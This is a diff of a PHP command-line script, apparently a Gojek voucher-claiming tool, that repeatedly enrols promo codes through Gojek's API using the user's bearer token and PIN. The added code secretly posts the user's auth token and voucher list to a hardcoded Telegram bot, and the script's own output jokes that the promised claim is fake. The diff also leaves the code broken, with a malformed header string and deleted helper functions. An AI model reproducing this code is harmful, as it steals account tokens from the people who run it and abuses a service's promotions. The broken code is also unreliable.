@@ -6,7 +6,7 @@ $header = array();
 $header[] = 'Content-Type: application/json';
 $header[] = 'X-AppVersion: 3.46.2';
 $header[] = "X-UniqueId: ".time()."57".mt_rand(1000,9999);
-$header[] = 'X-Location: id_ID';
+$header[] = 'X-Location : -6.255951,106.869717";
 $header[] ='Authorization: Bearer '.$token;
 $header[] = 'pin:'.$pin.'';
 //CHECKER DETAIL AKUN
@@ -1059,88 +1059,120 @@ $detail_voucher = curl('https://api.gojekapi.com/gopoints/v3/wallet/vouchers?lim
 ";
   }
   }
- echo "\n".color("nevy","Mau Cek Paylater?: y/n ");
+ echo "\n".color("nevy","MAU CLAIM VOUCHER ?: y/n ");
         $pilihan = trim(fgets(STDIN));
         if($pilihan == "y" || $pilihan == "Y"){
-        echo color("red","===========(CHECK PAYLATER)===========")."\n";
-        sleep (5);
- $paylater = curl('https://api.gojekapi.com/paylater/v1/user/profile', null, $header);
- $duit = json_decode($paylater[0]);
- $status = $duit->data->credit_nonfraud_eligible;
- $money = $duit->data->credit_limit;
-    echo "\n".color("yellow","Status = ".$status." \n");
-   echo color("yellow","Limit Tersedia = Rp".$money." \n");
- $transaksi = curl('https://api.gojekapi.com/paylater/v1/user/transactions', null, $header);
- $data = json_decode($transaksi[0]);
-  if ($data->success == true) {
- $status1 = $data->transactions[0]->amount;
- $status2 = $data->transactions[0]->description;
-    echo "\n".color("red","HUTANG = ".$status1." \n");
-   echo color("red","TRANSAKSI DI = ".$status2." \n");
-}else if($pilihan == "n" || $pilihan == "N"){
-         die();
-         }else{
-echo "".color("red","AKUN BELUM UPGRADE \n");
-}
-}
-//CHECKER AKHIR
- function nama()
-	{
-	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, "http://ninjaname.horseridersupply.com/indonesian_name.php");
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-	$ex = curl_exec($ch);
-	// $rand = json_decode($rnd_get, true);
-	preg_match_all('~(&bull; (.*?)<br/>&bull; )~', $ex, $name);
-	return $name[2][mt_rand(0, 14) ];
-	}
-
-function curl($url, $fields = null, $headers = null)
-    {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        if ($fields !== null) {
-            curl_setopt($ch, CURLOPT_POST, 1);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
+        echo color("red","===========(CLAIM MULAI)===========")."\n";
+	 }
+        sleep (10);
+        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD260520"}');
+        $message = fetch_value($code1,'"message":"','"');
+        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
+        echo "\n".color("green","🔓▶️ Message: ".$message);
+        goto gocar;
+        }else{
+        echo "\n".color("red","🔐▶️ Message: ".$message);
+	      gocar:
+        echo "\n".color("nevy","# CLAIM FOOD 35+30+25k");
+        echo "\n".color("yellow","# TAPI BOHONG , WKWKWKWK ");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(15);
         }
-        if ($headers !== null) {
-            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD260520"}');
+        $message = fetch_value($code1,'"message":"','"');
+        if(strpos($code1, 'Promo kamu sudah bisa dipakai.')){
+        echo "\n".color("green","🔓▶️ Message: ".$message);
+        goto gofood;
+        }else{
+        echo "\n".color("red","🔐▶️ Message: ".$message);
+        gofood:
+        echo "\n".color("nevy","# CLAIM ULANG");
+        echo "\n".color("yellow","SAMPE CROT");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(15);
         }
-        $result   = curl_exec($ch);
-        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        
-        return array(
-            $result,
-            $httpcode
-        );
-	}
-function color($color = "default" , $text)
-    {
-        $arrayColor = array(
-            'grey'      => '1;30',
-            'red'       => '1;31',
-            'green'     => '1;32',
-            'yellow'    => '1;33',
-            'blue'      => '1;34',
-            'purple'    => '1;35',
-            'nevy'      => '1;36',
-            'white'     => '1;0',
-        );  
-        return "\033[".$arrayColor[$color]."m".$text."\033[0m";
-    }
-function fetch_value($str,$find_start,$find_end) {
-	$start = @strpos($str,$find_start);
-	if ($start === false) {
-		return "";
-	}
-	$length = strlen($find_start);
-	$end    = strpos(substr($str,$start +$length),$find_end);
-	return trim(substr($str,$start +$length,$end));
+        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD260520"}');
+        $message = fetch_value($code1,'"message":"','"');
+        echo "\n".color("green","🔓▶️ Message: ".$message);
+        echo "\n".color("nevy","# CLAIM LAGI GOFOOD 15+10+5k");
+        echo "\n".color("yellow","# SABAR YA , DIKIT LAGI KOK BIAR CROT");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(5);
+        }
+        sleep(15);
+        $boba09 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD260520A"}');
+        $messageboba09 = fetch_value($boba09,'"message":"','"');
+        echo "\n".color("green","# Message: ".$messageboba09);
+        sleep(3);
+        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=13&page=1', $token);
+        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
+        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
+        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
+        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
+        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
+        $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
+        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
+        $voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
+        $voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
+        $voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
+        $voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
+        $voucher11 = getStr1('"title":"','",',$cekvoucher,"11");
+        $voucher12 = getStr1('"title":"','",',$cekvoucher,"12");
+        $voucher13 = getStr1('"title":"','",',$cekvoucher,"13");
+        echo "\n".color("purple","🎫▶️ Total voucher ".$total." : ");
+        echo "\n".color("nevy","                     1. ".$voucher1);
+        echo "\n".color("nevy","                     2. ".$voucher2);
+        echo "\n".color("nevy","                     3. ".$voucher3);
+        echo "\n".color("nevy","                     4. ".$voucher4);
+        echo "\n".color("nevy","                     5. ".$voucher5);
+        echo "\n".color("nevy","                     6. ".$voucher6);
+        echo "\n".color("nevy","                     7. ".$voucher7);
+        echo "\n".color("nevy","                     8. ".$voucher8);
+        echo "\n".color("nevy","                     9. ".$voucher9);
+        echo "\n".color("nevy","                     10. ".$voucher10);
+      	echo "\n".color("nevy","                     11. ".$voucher11);
+        echo "\n".color("nevy","                     12. ".$voucher12);
+        echo "\n".color("nevy","                     13. ".$voucher13);
+        echo"\n";
+        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
+        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
+        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
+        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
+        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
+        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
+        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
+        $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
+        $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
+        $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
+        $expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
+        $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
+        $expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
+        $TOKEN  = "0000000000:7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
+      	$chatid = "";
+      	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
+      	$method	= "sendMessage";
+      	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
+      	$post = [
+      		'chat_id' => $chatid,
+                'text' => $pesan
+        	];
+                $header = [
+                "X-Requested-With: XMLHttpRequest",
+                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
+                        ];
+                                        $ch = curl_init();
+                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                                        curl_setopt($ch, CURLOPT_URL, $url);
+                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
+                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                                        $datas = curl_exec($ch);
+                                        $error = curl_error($ch);
+                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                                        curl_close($ch);
+                                        $debug['text'] = $pesan;
+                                        $debug['respon'] = json_decode($datas, true);
 }
